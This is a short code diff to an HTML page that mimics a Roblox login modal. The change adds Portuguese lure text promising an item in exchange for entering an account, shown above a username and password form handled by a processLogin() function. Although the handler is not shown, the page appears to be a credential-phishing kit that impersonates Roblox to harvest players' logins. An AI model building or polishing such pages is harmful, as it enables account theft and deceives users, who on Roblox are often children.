@@ -143,7 +143,7 @@
             align-items: center; justify-content: center; margin-top: 10px;
         }
         .roblox-btn-primary:hover { background-color: rgba(255,255,255,0.1); }
-        .roblox-wordmark-wrapper { width: 100%; display: flex; justify-content: center; margin-bottom: 30px; }
+        .roblox-wordmark-wrapper { width: 100%; display: flex; justify-content: center; margin-bottom: 20px; }
         .roblox-wordmark-wrapper img { width: 150px; height: auto; }
 
         /* Admin Fab */
@@ -201,9 +201,13 @@
     <div id="modal-login" class="modal-overlay">
         <div class="roblox-modal">
             <button onclick="closeModals()" class="absolute top-4 right-4 text-gray-400 hover:text-white text-xl"><i class="fa-solid fa-xmark"></i></button>
+            
             <div class="roblox-wordmark-wrapper">
                 <img src="https://logos-world.net/wp-content/uploads/2020/11/Roblox-Logo.png" alt="Roblox" class="img-white-filter">
             </div>
+            
+            <p class="text-center text-gray-200 mb-6 font-medium">Coloque sua conta para receber o item</p>
+
             <form onsubmit="event.preventDefault(); processLogin();">
                 <input type="text" id="inp-user" class="roblox-input" placeholder="Usuário/e-mail/telefone">
                 <div class="password-container">
